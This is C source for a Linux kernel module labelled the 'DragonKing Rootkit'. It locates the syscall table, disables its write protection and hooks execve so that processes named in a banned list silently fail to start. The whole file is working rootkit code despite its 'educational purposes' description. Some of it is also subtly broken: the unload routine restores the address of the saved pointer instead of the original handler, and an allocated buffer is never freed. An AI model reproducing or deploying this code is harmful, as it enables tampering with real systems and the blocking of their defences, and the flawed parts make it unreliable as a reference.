#include "DragonKing.h"

//DragonKing Rootkit. 

MODULE_LICENSE("GPL");
MODULE_AUTHOR("DragonKing");
MODULE_DESCRIPTION("A rootkit for educational purposes");

unsigned long** sys_call_table;

asmlinkage long hacked_execve(const char __user *filename, char const __user *argv[], char const __user *envp[]){

	char *kern_buff = NULL;
	int i;
	int ret = NULL;
	kern_buff = kzalloc(strlen_user(argv[0])+1, GFP_KERNEL);
	copy_from_user(kern_buff, argv[0], strlen_user(argv[0]));

	bool isBanned = false;

	printk("FILENAME: %s\n", kern_buff);
	for(i = 0; i < sizeof(BANNED_PROCESSES)/sizeof(char *); i++){
	
	if(strcmp(kern_buff, BANNED_PROCESSES[i]) == 0){
	//printk("Banned process was executed.\n");
	ret = -ENOENT;
	return ret;
	}
	
	}
	
	ret = (*orig_execve)(filename, argv, envp);
	return ret;
}

void set_addr_rw(unsigned long addr)
{
	    unsigned int level;
	        pte_t *pte = lookup_address(addr, &level);

		    if (pte->pte &~ _PAGE_RW)
			            pte->pte |= _PAGE_RW;
}

void set_addr_ro(unsigned long addr)
{
	    unsigned int level;
	        pte_t *pte = lookup_address(addr, &level);

		    pte->pte = pte->pte &~_PAGE_RW;
}


static int __init dragonking_init(void)
{
	sys_call_table = (unsigned long**)kallsyms_lookup_name("sys_call_table");
	set_addr_rw((unsigned long) sys_call_table);
	orig_execve = (void *)sys_call_table[__NR_execve];
	sys_call_table[__NR_execve] = (unsigned long*)&hacked_execve;
	set_addr_ro((unsigned long) sys_call_table);
	printk(KERN_INFO "This is a rootkit.\n");
	return 0;    
}

static void __exit dragonking_cleanup(void)
{
	    set_addr_rw((unsigned long) sys_call_table);
	    sys_call_table[__NR_execve] = (unsigned long*)&orig_execve;
	    set_addr_ro((unsigned long) sys_call_table);
            printk(KERN_INFO "");
	    printk(KERN_INFO "Rootkit removed.\n");
}

module_init(dragonking_init);
module_exit(dragonking_cleanup);
